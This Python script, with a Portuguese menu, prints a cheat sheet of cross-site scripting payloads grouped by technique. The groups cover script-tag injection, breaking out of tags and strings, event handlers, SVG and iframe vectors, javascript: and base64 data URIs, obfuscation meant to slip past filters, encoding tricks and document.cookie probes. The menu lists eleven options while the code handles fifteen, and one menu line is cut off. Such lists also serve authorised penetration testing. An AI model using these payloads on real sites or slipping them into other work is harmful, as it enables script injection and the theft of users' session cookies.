import os
import textwrap
def xss():
    os.system('clear')
    print('''⡟⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⠀⢸⠙⠲⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢱⠀⠸⡄⠀⠀⠉⠓⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⡄⠀⢳⠀⠀⠀⠀⠀⠈⠓⠦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⡄⠀⢣⠀⠀⠀⠀⠀⠀⠀⠈⠙⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠹⣄⠀⠱⣄⢀⡀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⢳⣄⠈⠲⣍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠷⣄⠈⠓⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⣦⣄⠈⠓⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⣀⠈⠑⠦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢦⣀⠀⠉⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠞⠉⠉⠓⠦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣀⠀⠉⠲⢄⡀⠀⠀⢀⣴⡟⠃⠀⠀⠀⠀⠀⠈⠑⠦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠦⣄⡀⠈⠓⢤⣼⣭⡷⣄⠀⠀⠀⢼⣿⣷⠀⠀⠀⠙⠶⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢳⣴⠿⠋⠻⢿⣆⡑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣤⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠿⢶⣌⠲⢄⡀⠀⠀⠀⠀⠀⣀⣀⡀⠈⠙⢷⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣦⣙⡢⣄⠀⠀⠀⠘⠛⠃⠀⠀⢀⡸⣷
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢿⣧⣙⠢⢄⡀⠀⠀⢀⡴⠋⠀⣼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢿⣦⡈⠓⢴⠟⠀⠀⣴⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣶⢾⣤⣷⡟⠁⠀''')
    print("")
    while True:
        print(textwrap.dedent(
            "\n[1] Testar se scripts simples executam direto na página"
            "\n[2] Testar se dá pra fechar tags ou strings e injetar script"
            "\n[3] Executar código usando eventos HTML (onerror, onmouseover, etc)"
            "\n[4] Testar execução via IMG, SVG e IFRAME"
            "\n[5] Testar execução usando links javascript: (JavaScript URI)"
            "\n[6] Testar execução usando DATA URI e Base64"
            "\n[7] Tentar burlar filtros usando ofuscação em JavaScript"
            "\n[8] Testar se HTML ou URL encoded é decodificado pela aplicação"
            "\n[9] Testar execução de código via CSS ou atributo style"
            "\n[10] Testar redirecionamento automático com Meta Refresh"
            "\n[11] Testar payloads que funcionam em vários"))

        print("\nPressione Enter para sair....")
        escolha = input("\n> ").strip()
        if escolha == "1":
            os.system('clear')
            print(textwrap.dedent('''<script>alert(1)</script>
<script>alert(123);</script>
<script>alert("XSS");</script>
<ScRipT>alert("XSS");</ScRipT>
</script><script>alert(1)</script>
'''))
        elif escolha == "2":
            os.system('clear')
            print(textwrap.dedent('''"><script>alert(1)</script>
';alert(1);//
");alert(1);//
<<SCRIPT>alert("XSS");//<</SCRIPT>
'''))
        elif escolha == "3":
            os.system('clear')
            print(textwrap.dedent('''<img src=x onerror=alert(1)>
<div onmouseover='alert(1)'>DIV</div>
<input onfocus=alert(1) autofocus>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
'''))
        elif escolha == "4":
            os.system('clear')
            print(textwrap.dedent('''<IMG SRC=javascript:alert('XSS')>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
<svg><script>alert(1)</script></svg>
'''))
        elif escolha == "5":
            os.system('clear')
            print(textwrap.dedent('''<a href="javascript:alert(1)">X</a>
<iframe src=javascript:alert(document.location)>
<form><button formaction=javascript:alert(1)>
'''))
        elif escolha == "6":
            os.system('clear')
            print(textwrap.dedent('''<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
'''))
        elif escolha == "7":
            os.system('clear')
            print(textwrap.dedent(r'''<script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>
'''))
        elif escolha == "8":
            os.system('clear')
            print(textwrap.dedent('''&#60;script&#62;alert(1)&#60;/script&#62;
%3Cscript%3Ealert(1)%3C/script%3E
%253cscript%253ealert(1)%253c/script%253e
'''))
        elif escolha == "9":
            os.system('clear')
            print(textwrap.dedent('''<div style="width:expression(alert(1))">
<style/onload=alert(1)>
'''))
        elif escolha == "10":
            os.system('clear')
            print(textwrap.dedent('''<meta http-equiv="refresh" content="0;javascript:alert(1)">
'''))
        elif escolha == "11":
            os.system('clear')
            print(textwrap.dedent('''<scr<script>ipt>alert(1)</scr</script>ipt>
<script>({0:#0=alert/#0#/#0#(1)})</script>
'''))
        elif escolha == "12":
            os.system('clear')
            print(textwrap.dedent('''<form><button formaction="javascript:alert(123)">TEST</button>'''))
        elif escolha == "13":
            os.system('clear')
            print(textwrap.dedent('''<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
'''))
        elif escolha == "14":
            os.system('clear')
            print(textwrap.dedent('''<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
'''))
        elif escolha == "15":
            os.system('clear')
            print(textwrap.dedent('''<script>alert("XSS OK")</script>
'''))
        elif escolha == "":
            os.system('clear')
            break



